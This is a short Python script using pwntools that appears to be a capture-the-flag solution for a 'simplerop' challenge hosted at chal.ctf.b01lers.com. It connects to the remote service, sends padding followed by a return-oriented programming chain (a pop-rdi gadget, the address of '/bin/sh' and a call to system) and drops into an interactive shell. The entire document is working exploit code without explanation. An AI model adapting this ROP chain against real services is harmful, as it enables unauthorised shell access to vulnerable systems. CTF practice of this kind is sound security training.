#!/usr/bin/python3
from pwn import *

p = remote( 'chal.ctf.b01lers.com', '1008')
#p = process ('/home/pooty/shared/biolers/simplerop-af22071fcb7a6df9175940946a6d45e5')
#input('attach')


binsh   = p64(0x402008)
system  = p64(0x4011df)
poprdi  = p64(0x401273)

shellcode = b"aaaaaaaa"
shellcode += poprdi
shellcode += binsh
shellcode += system
p.sendline(shellcode)

p.interactive()
